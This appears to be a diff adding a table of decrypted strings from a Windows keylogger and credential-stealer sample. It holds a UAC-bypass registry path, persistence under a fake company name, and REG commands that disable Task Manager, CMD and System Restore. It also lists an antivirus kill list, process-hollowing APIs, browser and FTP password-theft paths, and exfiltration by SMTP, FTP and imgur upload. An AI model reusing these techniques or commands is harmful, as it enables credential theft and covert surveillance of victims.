@@ -1,0 +1,458 @@
+K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4fpmLi/O+20Ac6XwZSCbadNtIahNa80MTpAMCWN3QkiFxfHyRWD2OvLT9n8OC99lDs= | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+1jb8AudXf9ptWpuwzIAMvw== | EnableLUA
+84htGJR8cIVATCAwL9pcMw== | 1
+snFXrTN/4vrhyPiQz6AoZle45MW1/pvBOpAk1tXUlNC98Yy6Rg7ckGphRLmOhs6Oxl/10aTv374bQoAt24Dnwg== | Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+oGpCwgqOkJq8UqTqtMOP0KF6c4aLUXG+BYc9qTCrzRp+5exBSn8F2AmSWS1DwVn5 | {0} Start-Process -FilePath "{1}" -wait
+LvWpYUoNhLQcAEZrUU5vJXfm8AMpWkioRks6kR/avF7AxNEH3J8ItHmpZzPVbkQo | SOFTWARE\Classes\mscfile\shell\open\command
+Cho8lYiplWIp97x+d9e+Ww== | eventvwr.exe
+LvWpYUoNhLQcAEZrUU5vJc44VbAVyLVOc2pC4FTD8xE= | SOFTWARE\Classes\mscfile
+jt4JXyzFY+P3zf6k/0mkCA== | Windows 7
+WY/qFt+dX2Df9KlaXwh7Dg== | Windows 8
+yELl4NlRz7vMnB6B63zUbg== | Windows 10
+h70oAKbD4BDUEdcNDLfT7A== | 0
+haLsi+cj0yodiuWmM+o4Wg== | appdata
+x8DKn6M+7Z6817e9cHJI9UXMEty1KNxNeYck2of8Ni0= | \National Oilwell Inc\
+Akq+/Qobe3bW+jdjmv5oI5U7Z9BdClsizpKUb3HtChUz3SNJfwOuCb74yondCL96 | Software\Microsoft\Windows\CurrentVersion\Run
+4C6Wx2hWwu1P9B+dJ5UbHASnqsVThjy2f29hfh+oQGw= | National Oilwell Inc
+3zgKylgTkBqowbdc1z3NjnOEOX1XUI3LNA3+hElyKGNAmHbSmG27g9WFRVrlNY55jpM+FkaD9WRWS635QlIX5/ibNLvQyXvdiAKH0aItVK8= | SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
+IM8Uo3VnEo8+NZZe2fa0dXus9/sV0JbokGsD4pmezO4= | Shutdown -r -t 5
+hyNN5z+7qAsS695lDXLuHg== | True
+PpBkJ0OT3vPrPV9amh3tIw== | Player
+cWUeT8dJU4KfzxUEgGflzQ== | temp
+FtO3o9x/w+Ole8I84aAzLw== | \
+Nhb0LLM4pbr57CcU1BqWFw== | .exe
+4DpIaBrsoOfdxn4a8FueDw== | Johnson
+Xru0dArIHtnQYxKs4pujiw== | Miller
+9PRYo1nwE7acjIlNFos31g== | michael
+qggC78ucn0PKPCwsg/mFNQ== | Abby
+ABAtKSpwYz+95FSx8yc5Pw== | Emily
+3ufhCmF9/TPsbzyl95q0/g== | Length
+0sUXgnOipyuZBK1nlNzHJw== | root\CIMV2
+1O9YhDmJ0bVT8S2e0J6RZaOg79Sx0s0ZgAlMsO52ECRF9FbzdErSzGElM43WPd/l | SELECT * FROM Win32_VideoController
+1O9YhDmJ0bVT8S2e0J6RZYSivqVx/+XI3VlvwmgCHxs= | SELECT * FROM Win32_Processor
+kkzyKhhxe0N+EYGYxKqD/A== | Name
+l/SGiQBjcGCF3P/i/Wo/2Q== | MB
+RDzHfesOWTU8pRYqLYeaTA== | AdapterRAM
+BfysXpq+8Xp+Gg6AmvPvgg== | Unknown
+QqCP6Qn7p8C/lRgf5zd8Xg== | WebCap
+6241fZEGRJ5YqlCgonSMsw== | \CamCampture
+NHaMN9drOOEU9VGqF00KDXl23d/v6vf8y5rXugAfYT8= | \CamCampture\webcam.jpeg
++KvItdCkbJYVhD5M+8OWWuNMaKVwLuIiBwNvfWU5drw= | MM/dd/yyyy HH:mm:ss
+3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntFnlhPkJpmdosUIqq2culK+naW4A1zSN94YvYMG3n6zXShd+mQHa+GPmBhQn/tDNZefNBjQR9gS68mHxjnArp+sStk4jEIxdoaAa9A1VHcUT75Ki1tN4/dEaP2VDI3FG0TF+B/ZuoIqSWkjklStLGN | type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+client={8}
+link={9}
+username={10}
+password={11}
+screen_link={12}
+site_username={13}
+d+WTnirNAiuNRrGVgMVl5Q== | webcam
+eCqe8oqjGUIRwUWqnBrrpA== | /
+ligGKnENDwQBwtGNHaYwFBAC06jzt1ZraamTIwJXP/s= | Webcam Capture From:
+uNywgp3gcTTyKeIZNvtRFqDBnfUV92CQGHMsBMNEJEAOrU7d7MDLECDC0eY2zvS+RLxYKLxfIdRbffu2teOmyW+bpCfzG3tWFI35VVVduzAC2UTKPI3G+FFWlOe4MuHsqRBPFsMUzS+hvasThCodGqjQQsD5nq8mDKhfSC2GwvzScWOEowAiGyNv+0uoRhoXiKNK3rW4mFF5WcuCEqvxtcWP9lF8j1MCIEToLuId3PdK5uW6E5e+6PBBBNrqD9J/ | <span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;:
+ay/5FIVZ/uJmQp+w5q8vc9AB9saMYthhJr4ahhI0O/k= | rock_ketme@zoho.com
+I/tDnJPWEB6yySAivkY/576ixyY2gOP+bLVbbaRIV8A= | yyyy_MM_dd_HH_mm_ss
+pGHSXD+I/RvlIAkA7O7pQg== | Webcam_
+q542gy/+wDIUJhH3OGKnNg== | -
+W4bCr60vBIwmtjga81qp0A== | _IP_Adress_
+3TzIyOOSC+3lcpPaeTxO6g== | _
+nt6DnDJw7JlONF3+NnP2Cw== | .jpeg
+xnSWaDOipDguU4Wl8NB0UQ== | 3ce63074cd9dcf8
+6pDz4EH7eT8CtKcZK1n6iA== | Headers
+yOvGyrB4jDSFzAnwZLXW+w== | Add
+j/MpWj9c7cJlpJhmBGKrag== | Authorization
+QDDua4v2T/IujgOi7VZF7g== | Client-ID 
+cXvxK6cp99QmpqjnL/148g== | add
+ks5MgUfVkVYEd/kJQb2ezw== | image
+W/RSLZtn/V2Yc2Oaawwueg== | UploadValues
+dO9fGeJ7Kp6EKvpiNLAD0eLlyk0Aygl2BzPxZIEvArt31Bkb8lDLceEWVynauycl | https://api.imgur.com/3/upload.xml
+XDW+23+22aO582jMRAeFnA== | \ScreenShot
+ypfDayM/MDyPSlv5Kdo5azdZFpF/T0KYdq/9MnKxVZI= | \ScreenShot\screen.jpeg
+8S6EhTx7X83IUy7c82QJ7A== | screenshots
+XHhfg114im09fIV8yaSau2C5h0bwfnQpUEMXQqTTL08= | Screen Capture From:
+pWf9GeSP/oSVIicTwH+ujQ== | Screenshot_
+2qbrW8tf2IZoaPGZlcaKWw== | /log.tmp
+Sc69FTaFZM54u472pPaOXQ== | keylog
+v4EpbnhZTubu6HTjEZ8Gdw== | [SavedLog (
+qB2IgrG4rJrjzHnozh5XNg== | [Saved Log] 
+vIVCzK1unR/qXJST51ENdS8w1OrXib7HxoYSLPk1gCY= | Keystrokes From: 
+82ZGUDSQrPCv8v1Hf+HpRA== | </span>
+Q9Yhy5Uive3G6Gspdid9EQ== | Saved_Log_From_
+4T5LGk6qEvqUS2xRJLUlww== | .html
+yN4uMqCl2degCjnj4AuHbO5vNBAmbfUDS0u7etQ1RdNOLEn+BjzrAMNth43QwEFJ8tRPmeHfdsHnW/LmiJ6W9fU+yLxYup6Gq4UA3ctDZ6tBGoBahiCVlkKBNbpmbE/N2pTXeVJ2qlmH45HhNW2EfFF8iE0CbEq6PmD8kFUlLhsCoPcZB/kCjL0LNCYqfV/tArIzwh0vhTtaIcZ1swa02qgQrNEILjcrgB4zolqeykDR72Zbhbs9dMitps7QGYyl | <html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: 
+QPOSOv+tW8xdwNqY8eTkUw== | </span></html>
+hv0n+Cbvmasyx9ibZq4ZmA== | Keystrokes_
+tdbvUCxttbYV0EawQVXj9w== | update
+OdF1EG4H2FuH64BzUwBAcg== | info
+wal5VnjsAQ9zfeyA2jf+gw== | uninstall
+Akq+/Qobe3bW+jdjmv5oI6h1rNqdq+rlANdh6Ef29KelgAp0y6gsCspLDS+k+xmNC9TpnFhgwZyL///RhoSWxQ== | Software\Microsoft\Windows NT\CurrentVersion\Windows
+aZG83zDiQxysOvFJFc8qmg== | Load
+YwDTrWXAV1F/PvXKBuarog== | %ftphost%/
+5nurkypTPRiEiXigUhmGkQ== | %ftpuser%
+gzsAFMgl4BIfpfKHdq7Uiw== | %ftppassword%
+zLhRCHskrgfwCC7x8L9sQQ== | STOR
+DTWHvaQIZQVc5pCkLjlxfg== | Write
+i3SskJCMJiEi/z3gGDIn6A== | Close
+3T4xI1CvPpe0ypzhkakJ0EBNR0ZuOgpka+Xt3s81PWkyFSR4fqU2jTmYyUfbxzWcHJMpBOmruC7UDvzylf7ARPahyaxxiqiaQKeuiRlggntUwOuJhdEkvGPuYYdltuNRG+c6D/iwXe+gm+5f4psFF1F73Gw/mzF37oCsXuUTe8nBRS+7D6UkKE9dhE7/noqB | type={0}
+hwid={1}
+time={2}
+pcname={3}
+logdata={4}
+screen={5}
+ipadd={6}
+webcam_link={7}
+screen_link={8}
+site_username={9}
+[passwords]
+Zqe1ddpM2Flw4NHWRh0R1A== | passwords
+1rFXNQd9jNhZ7HixzgoKJA== | Count
+FXiNY3K+jDPAu07jcUM1KRxno/g6DZyUVUmsjKIACuaeSJHX7a+Q8Z2UQfXbYql/lXzRxbKC0QwbBRcEmi13CA== | client[]={0}
+link[]={1}
+username[]={2}
+password[]={3}
+Xm3hrwj60HWjb71M1bS+Pw== | 
+wpLiVRcvFijD3b6RjE29rQ== | APPDATA
+4TAOpYvRtTG3ssTwK4ma4sFhCu5SID5jBdiG744/qOY= | \CoreFTP\sites.idx
+kwTbWGPthx54z7ItP6ZZgGTzcfyiRbHbJ8Xm4KgBr1zGZHArT3bc+XcLucE82M2abHHDCxscokOXYDUshjweVw== | HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\
+w6O5o59OxPOdNfoFFDv9Vg== | Host
+kwTbWGPthx54z7ItP6ZZgC9T5GX5tlxzFgXJIvCE0uES5VPzgGrSnG3K/lJOBL1m | HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites
+Ycgrb6PLHSwxctjm8V+U0g== | Port
+B6UJuSMiPSa02PYTuv9Jcg== | User
+/NjjK2/CTXiUqveQWXmasQ== | PW
+byzWbxhZH2XQb9hWWUSwqg== | CoreFTP
+QLZGY78+zXUNT2jX7mlgXD+0Zy9QfeBN/YljDjfOrSU= | Passwords Recovered From: 
+A1PTwV76u4Vgp49jh17ShYXIVFBSFLljZpz4qEan9tA= | Password_Recoveries_
+Wlq1nZovw/mhmqvH0xxZ/A== | okafor94
+qtO4YzaSI2j8hzFKdNkU2Q== | smtp.zoho.com
+oikfCuTLFenr3SHYSEZ4i4l/+ojgp7rxEaIDYGVnaoo= | :Zone.Identifier
+/UQ3JCwhq+Gz2N5ghZStSQ== | %DownLink%
+KIviMhlEYA8aInX/5Qb9hA== | /%filename%
+pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z79Ztwo84c4IPrex/3+thFOvnyIjawY0jfguxMhdkpsWHegdQoXA9gwAA/LACAXrHQ== | REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+pXKJDGh/uBFBqJOOUmDGtZEGHJOj7ylWAqwD4Ul+dkAXRFJ3EV5kYk8JrGMR/mX4zToM5y7Hi/hwtaL9bCKBUWp7vANvytj5gwvwnPh3h/22AI4kritqlkeDUTtaZQVP | REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f
+kwTbWGPthx54z7ItP6ZZgFtKZgsRq7szebbB4S/fZHH4R/CDIhtDlP3CZXvJIu0jE7AUBZYv7By9njDrk0TnkA== | HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System
+YdZsPXo5ZDP93xut0S4QKQ== | DisableCMD
+pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z/VyWWNywzGCv/1pkHBHdlF3/0rGzozhPzTyG/vCdkyA4QQ6P98z9IBBX+cQLZGPyw== | REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f
+pXKJDGh/uBFBqJOOUmDGtai2K76rV7NdqK+Fs4s+C6Pg68ik04e2NfQREG7baRtzyBvibnT1QTT8Pv9KTqO4Z1eg53eIIY9JEWfA2TPeLFnVzW8Yrk0MiQckl5DyvUdV2dqcm8jHKC7gHyXGu/Hi3g== | REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
+kwTbWGPthx54z7ItP6ZZgKl9xrkcF1nZTS4MNSHEEbJcJIB9KKPGovoQ/WeUeiRJoulBapu+Q7Gk2UzAUpYj+E4tKch5C6zfqTkJ6NAg3tI= | HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System
+mQqftbRCZSvdu2yKy5WdmCQp9TnChZfFlB9thhYkzTw= | DisableRegistryTools
+K0ocYJdpSlFAvhxHrgztFQgMSAGTR4Y34Eo23ag/X4frsIP6jgmDDgB1p812ZubR1SRsrtb+nbgpBb5Nl7U5iaIzUhRrQYFxwVHKwqxx3RU= | HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore
+0fAR0g3wDywNB8Zm6LvR0A== | DisableSR
+I7rlzsjTmjXEy5niDv06H54CyNwUescc+Nt1sZ3dGntAH+6UkNoCC+NCLDzKbmKH2JmpccFtngJplDnS404OCqfnh6ec3FEznRdG0/Be2xLYHy7O4pOSti7yCiJ5Z3e5Y7d5vTpQrr8fpphrm1we/j1ogtES7tMLz/aprDN82Vk= | REG add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+p9/sAL17NWwDMFnldIP11aCX940za0ouDXRy1bBoBrVoaAhBH1IHHurfAGP2y1XBwxArkc4MAZrVvEeFw2jRQNiKfIVpF7zToDxhqIVt6qnuu2zBI1Cw5i9nDP7dDnXcIrrz8g0Xutfp/OKRqijUr5a8iWXQDeXW8VuWBhX7wGE= | REG add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
+3zgKylgTkBqowbdc1z3NjnOEOX1XUI3LNA3+hElyKGOQRTruKpERDieoI1PdXLrc/OBfBfE/7Di/ZwkT1IrAUA== | SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths
+uuXCAKY6xDM9w0TxkU/i0A== | MSCONFIG.EXE
+VVdlIKEaUh6SRldwykrZgQ== | \tmpG
+PTG3dyeodBPPTTLkUuHvJA== | .tmp
+ct9ohcuC/ipgVr5A31KpGg== | length
+yJ2qMAJyXhZHlp50824HSdArxsDOcSTLLq14sG6CQgY= | length must be > 0
+h7X8FV7+XYjBLAjik7kE5g== | \JavaUpdtr.exe
+zYMGsY8aSA781gMxSStsC9UAfia6hLdLRxgBeS3NtD0= | \Java\JavaUpdtr.exe
+8mFIzTz8+GxS3SBdy62qeA== | JavaUpdtr
+hgsLoRCFowHEFaiZ24Tm4w== | anubis
+hyND10q/Gct0fSgKnmVrpQ== | a2servic
+nwUYcPZACaihAjvclXYFDA== | ashWebSv
+0zOPwZmqcWlcoCwZVsCiEA== | hvk
+MiGtxZM6ypMhV0QP2DUZPw== | avgemc
+hIvIBuOh1Hbad4cssdzObQ== | bdagent
+KJGrHQcBKmibYJv4Rg2oeQ== | avp
+H7jtg1tgyxC2cKqM6J/IpQ== | keyscrambler
+itdbDWvkC1oMfeFAiNP37Q== | mbam
+jfpwGvCL86GIhgKjUbIKFQ== | ekrn
+AkpmnuxN1PoJWEnPEh7RRA== | egui
+jQGQKLpwQwg1OB/xlv8xPw== | npfmsg
+2YQ4oFVhLASjCtX984MKaQ== | ollydbg
+Rdv/i+D2zOrcRwM3GKgNog== | outpost
+qxwKKRXOAnhjnaQFTE7RFQ== | wireshark
++kRXtxxlq9UNH0xkfXnwXA== | mcagent
+qiuTLBRlsNF1qVI1HBdzew== | mcuimgr
+v/X3jo2U4AXkHGQvVxIU7g== | clamauto
+baRBtCOGmlADmyS4gZI+og== | cpf
+BAdL8mZS8WoQZvjwihHo7A== | ewido
+9RprxB4iapr5SMXZu5qvVQ== | FPAVServer
+hdQE8w9zn+/yuM02VtngDw== | SbieSvc
+ZNEWu/iCJwgz1mgF0dRcqw== | antigen
+FMzk2sQzjsOFdcYdxvQPCQ== | ccapp
+NQhoXvF73M1kJlAMEo+VDg== | tmlisten
+EbCCcXnqlGjCKmxcPuRuOA== | pccntmon
+104G1C4dVS1cP/AqCNl/AA== | earthagent
+H7PikNhZXmObhNrFe4IGiQ== | spysweeper
+XyUC0YMNp2KCMC7ARQHfsw== | %filter_list%
+7AV48FMYom3jRiORMwdKJtL5Xn9e9IN3whNSB/4NG45WbPsGoqFpQLCcz4rJDevDqs3Ewrfp8V2vUqdZ0/p3FA== | E+MTWs/(En()a3456d3h99sdf9sjdgA&%/+vkm&FGNBDSFs5(TRS%cxv
+pvX6ayVtPjG2DUE5o5Osvg== | p=
+BauHLy5/QvCPsG/qvqhZK4pH+Sa5QMESgvYIEx6aIEg= | %PostURL%/api.php
+xSzHph7pBUFwvUOkzcYOrSnVgrtesjsVAW5tR0LCpw81yVvvbAq1F9QimLns3CttNT2uNndpflR7RrD3a5LN9pi0YYcJkfCHfu6bf4kdZllul2ZZULpeKEO99JdpUg6DsWPSeDK2Hq/dchqH2q+/Jw== | Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
+9npcIgbXVHcqeMayTTHmTg== | POST
+L2u2LBmVjK9Jdkrxsuz1AQ== | +
+jg36Efzgo7kpA/Yloqnb+g== | %2B
+R/arOUkcgxLHPAWyUzAk7hiJZpDRPT1kiyetRhgVDv9cVu4lce4zRJKPNJILwwuy | application/x-www-form-urlencoded
+5VLTgwuSSXHyLYis8rELNl0AZkxNSAZoq5Dr9cX6HQ0= | http://checkip.dyndns.org/
+Qp4MXVN3WHRCEtMG2ScE0sVZgeWxzQwXU8fSt7ifqvCNNePTDp4RqvP2r/DeUQn0 | \d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
+zz+VAmVGWqvdCIFdUknvLA== | &
+aZbfLN7sA6OaZbfFIGc8Ig== | &amp;
+vxTv6ds7skm4CTte/+X7Bg== | <
+/GqY0rpin6fnd1w94mPeWA== | &lt;
+JCbUCh7tPK9MUrIEPVpP1g== | >
+ieTLqRik1rZ3NUgkQFsvdQ== | &gt;
+J4TYpBNSFoaeSq6MjuzO4g== | "
+DlDezBfQ+QVKZKzzYqO1dA== | &quot;
+mjW1014fRDWqkRrgWeyLEA== | : 
+hYj+berURG9qbiSIE4bh++abqwUn/Si0XB6nXto8au31U43CN8BduKAMUX8LLVzw1FKVrpetR4VB4L9qvjp6xe65o1CrhCvChWSs7Hfd2yxLNeIdhkpy5R29Svj9g2u/ | ]<span style=font-style:normal;text-decoration:none;text-transform:none;color:#000000;> (
+IMqa7/uMjEFhAZrJPRn9Gw== | False
+xRm1fBracupUySoA9cylwsAdlmHk/XWi/iVKTUsAFq1NC0R6SpJCfXS9YjFgKnlI | <font color=#008000>{BACK}</font>
+87x11BV8sTkYoy561BDZ9A== | </font>
+xRm1fBracupUySoA9cylwgMOx2Pq9SSmg4YPrIH0eb1FrVUD8gXIHxHyguoK5Izh | <font color=#008000>{ALT+TAB}</font>
+xRm1fBracupUySoA9cylwvQustDikfkUlYIpOGCcKBhmGKebSp5rcrr+rOgXkxt0 | <font color=#008000>{ALT+F4}</font>
+xRm1fBracupUySoA9cylwhHHE9gVBfX3+j2456j8GZzmuzwi7Edg8K/Xt3xEMKzM | <font color=#008000>{TAB}</font>
+xRm1fBracupUySoA9cylwq+5/WPdNXJ2dIaVKINbFJzeDOxB3MK6/ioVB3LOSKDo | <font color=#008000>{ESC}</font>
+xRm1fBracupUySoA9cylwmxYl6Jryw7QzpibCzw8cpXKgn3X3VyokcnXaGDybiJE | <font color=#008000>{Win}</font>
+xRm1fBracupUySoA9cylwtYWfm8DaoM8Mk/AXVsiQPrHjN3cHo86oqfYnz7KlJJf | <font color=#008000>{CAPSLOCK}</font>
+xRm1fBracupUySoA9cylwlp6n8Xw+vBY/eBO1TJy2AU/4pY3k+lLXWHvniVVCAii | <font color=#008000>&uarr;</font>
+xRm1fBracupUySoA9cylwoDPNYsC5HzBiVR2tjnvmbqECZMs4TqGUhkIweviZA8+ | <font color=#008000>&darr;</font>
+xRm1fBracupUySoA9cylwvPXue4ZTJh+arXBPZ8LWF2N5kMlivViRAtgCVJswLsp | <font color=#008000>&larr;</font>
+xRm1fBracupUySoA9cylwmNTADUxFECvCdRfiT1fh7/Ya/noXlmKJjtUidIQalFk | <font color=#008000>&rarr;</font>
+xRm1fBracupUySoA9cylwj6VIhdXah02b3VTHNaobkaPMBRBC5OcAxZdo3QrzLVW | <font color=#008000>{DEL}</font>
+xRm1fBracupUySoA9cylwrQ8K+GusHxzzEqV0xLLJGmGJD4Ughm1YghiwCgK6fnu | <font color=#008000>{END}</font>
+xRm1fBracupUySoA9cylwkbC1/qFLC/SQzkf085ItY4wM9srWLpGtMavmXiyhqqE | <font color=#008000>{HOME}</font>
+xRm1fBracupUySoA9cylwtyfOkkvLe8NYlm4qVsM3vWfYNpxep05iQMThHrVJgs3 | <font color=#008000>{Insert}</font>
+xRm1fBracupUySoA9cylwkkzGLWV3pXWY41bQVRmVeJk6Mbc1Up3O36fWGnfNqQj | <font color=#008000>{NumLock}</font>
+xRm1fBracupUySoA9cylwsThygi+zr1GPj/5yzOQBftbwZ4/Q1weEYpYLntb9X/5 | <font color=#008000>{PageDown}</font>
+xRm1fBracupUySoA9cylwv7Md8mHY387YlBDgudH1Gqdeh6Qxm5ocMSdqCsE9P4o | <font color=#008000>{PageUp}</font>
+xRm1fBracupUySoA9cylwpLdjrsTEmX7k1rpfOCsWvqd9VpqUt8F0j2SRAC42rnj | <font color=#008000>{ENTER}</font>
+xRm1fBracupUySoA9cylwsZeOzxhjGK2aZFVI8Clcjo= | <font color=#008000>{F1}</font>
+xRm1fBracupUySoA9cylwsHmpemQC5KT1MRD1066e0E= | <font color=#008000>{F2}</font>
+xRm1fBracupUySoA9cylwkYz4Tl4/qqswBmyY7Hrzkg= | <font color=#008000>{F3}</font>
+xRm1fBracupUySoA9cylwrxb3zymola2dBU03yJTqHg= | <font color=#008000>{F4}</font>
+xRm1fBracupUySoA9cylwn5D96LrPpgRHkiBVeRSKKw= | <font color=#008000>{F5}</font>
+xRm1fBracupUySoA9cylwiRc5xpwqwg1Su8dc+GStRY= | <font color=#008000>{F6}</font>
+xRm1fBracupUySoA9cylwvlZZPIbFFw/EogqRqrtJWg= | <font color=#008000>{F7}</font>
+xRm1fBracupUySoA9cylwkBYOZaEHSjY5HD/eXPjl7Y= | <font color=#008000>{F8}</font>
+xRm1fBracupUySoA9cylwmIYGyp/9YDddxgRl6JMtWY= | <font color=#008000>{F9}</font>
+xRm1fBracupUySoA9cylwmTeej7kNpjqk3liJYN2gVsojiDW3JHsP5F2phoMa+60 | <font color=#008000>{F10}</font>
+xRm1fBracupUySoA9cylwh5CxTOJ/uZrxOW4zRw3APip9qVSQlGYWjKQVAR1tbMP | <font color=#008000>{F11}</font>
+xRm1fBracupUySoA9cylwooZTfInf8Fbno7sAzWD4PeqEZ6I3Z7/lx1QZznmzgLX | <font color=#008000>{F12}</font>
+0XuB4qT44kEu3Z0S79ooOg== | 
+AwNvbJp5HKR7xaynKwPRLA== | control
+xRm1fBracupUySoA9cylwj2p7W/wciyqog/QugF8dQM6Hb/8zr+D7YbHA4lQ2Zc3 | <font color=#008000>{CTRL}</font>
+Fp9VrnIMHW1gb6lQZD/p7g== | .lnk
+7cUT2ztMdtc/tR7lMGy3/Q== | WScript.Shell
+Ub3Nni0I8+jKsJJSkd9efg== | CreateShortcut
+zh6FDYZwMREtCLFw0/8+Dw== | TargetPath
+bBNzVHKageQQMrpfwfYjwA== | cmd.exe
+ISn75Uxf1qJFrNZ3GcLXJgrDYj6QBRRHvmW6lxT3KPE= | WorkingDirectory
+LQ+rkKdofu1BUQYrxppV7g== | Arguments
+oqGnczAZJSK6F9S7S6a3XA== | /c start 
+mAYMU1K6wwXlVzDi/8gUlQ== | " "
+m5sFJydimaw946sNTl03BA== | &start
+z6o52Sz4f4AONENfKjha+g== | & exit
+B+Y2F0yLiLoyLH1c39BjJw== | IconLocation
+gJqzxsggdCLJ3/NcTb5XcQ== | Save
+dhxz9In2pvX1xJaeBcJSbg== | .lnk
+/ikyUZUxAvBns3XwMmet+6yOE//WPtjZdZMzm+ivrpU= | &explorer /root,"%CD%
+wbqyF1LirzZVagLFdhfxiw== | " & exit
+Oxkvp0X4DfChJnPmExtOrDcT9kATcZHjgbFya7cQH/lu4h5gIx78O788h5WpmT3i | %SystemRoot%\system32\SHELL32.dll,3
+mRHmVzVbphgmY4lkYv3UdR3SQbnZtbGHhNxMPnTRl9s= | Software\Classes\
+tpVhhSFpkRjM88IKq7yeMA== | OpenSubKey
+bqPKoDEMgn6vlPbHCTKXww== | GetValue
+5ZfDSi3G9sGm6dAzMtR6IA== | \DefaultIcon\
+NqAVeuyg+CiFTXJkUC6lbw== | ,
+X81NGRQLsC9VKemXA8RnMw== | ,0
+NYwSMsx0/B7nRn6LyB19PA== | None
+OY/80jDifzi7984QV8fXZg== | win32_processor
+B5YDTLEDBjd+8zy5lzEfjw== | processorID
+p/i+lQ2V1nI3nTAZaLeyJw== | WinMgmts:
+aOgzVe2oj9qrO3i0YWamnQ== | InstancesOf
+TRFEgTZqj8RrwTk5dNbwqw== | Win32_BaseBoard
+UrjZGnTdlnRsR8TeeLyCng== | SerialNumber
+00jGcfxtQ9s3AGYCJIG6qg== | x2
+9Exwi0W3fK/26edDb7Jm8g== | .dll
+u/kmrYrQevGpUj3toll5Yw== | vbc.exe
+tJqx37YHPrr3pSzFdH0lCg== | kernel32
+KeDhUoxa7gY0o/ukGnHVAg== | CreateProcessA
+cNIAlTQA01/KjOY13uy9W2/bTHRxuCIHObrYFvGN45w= | GetThreadContext
+mCrU9SslNOCpmfSZMVo83w== | ntdll
+2dA5A2tl5IS0RMtIpR/Am08odAwf602uxA0TmBSV9iw= | NtUnmapViewOfSection
+AO2MthwlZPGkc5wQs5d2VceFvnj1bHW6v5AE0H4X4Xw= | ReadProcessMemory
+40dxk8o/CaG3rT0fumtuqA== | ResumeThread
+yQIST1iZvHfcvejv7O43hMsOdm2eIuEEOoWNJ0ZdVaM= | SetThreadContext
+PmQpm+GQ5YvPot2lA+1coQ== | VirtualAllocEx
+dRxixE06aty6OyowekKwFROTegPJjqv4wLofU+KIx1Q= | VirtualProtectEx
+BWNWp0Fx8QSOKx857DmkGurzR/p5w9ybXZKQ9dE9F7Q= | WriteProcessMemory
+unjAb9CR9QJa+RjgchV5bQ== | origin_url
+8uKtjImLSsDlnrbG92hXAg== | username_value
+Kd+xPepKm/k0il1s95voqw== | password_value
+swsssXJQPwpBZ7ZjcY9lTJYx6laKzsGV2anwwRZKyVo= | \Google\Chrome\User Data\
+um7v20OaGIK8dIQkFUklcA== | Profile
+oZnP76oC1ZS4jaPK0QwXwA== | Default
+jw+ZQahqrPV+Nu07/71YHA== | \Login Data
+q1KtfWsMwUNGQbagNnayqg== | Chrome
+a8GP8b8cAjyx6syZvoL+Pg== | logins
+6FFqljhUZBTj+0fr8b1GPCcgWm1gKBK7ijX3+X0uJCWUlDsr1aRMLP05CWvwmgGD | Opera Software\Opera Stable\Login Data
+bX8DXkbdfwO/v8/bUIql/Q== | Opera
+KyYdSBI36ZKxH3VBnTfpwUPZomGy2ElAgy9DgfszK81bxMAkGRcqrcCDgfDwUfG0eZCKrHX/RXQAZ98NwVAwNw== | Yandex\YandexBrowser\User Data\Default\Login Data
+khxAIKZ/oAHEIylZ9vNcbQ== | Yandex
+6cIyLhoNRFyEV0Nw9ALDIA== | firefox
+6VVUjr8xhgFRi7R9nDwViw== | logins.json
+F3JACmraHUgJBF+dyIdXns5PrKEb2PxQhomrxEzRGxlE+uWSgmKlylGKLKJcItiR+6+VXm2MUgMNQTfVGriJjQ== | \"(hostname|encryptedPassword|encryptedUsername)":"(.*?)"
+YJZ2doDG2ISuEzTgGyregA== | Firefox
+b6bjqUFf4E50olRITPLS4w== | IELibrary
+YU5peex4DapddWFfhfcsQtOlqH1hgpkRzb1Dzb3tRUQ= | IELibrary.InternetExplorer
+tLB0k5ecoBa2pjPb7pcyssA34db7h0T6pkVflyelhEw= | GetSavedPasswords
+hMYHoskCVl7ojMO934yKlg== | URL
+7yxTuFw2mR1rvhoc/nix/A== | UserName
+zC6rDcYSQtGl61RYawCHyg== | Password
+0yBYMOk2pcR3PepHwYG8cg== | Browser
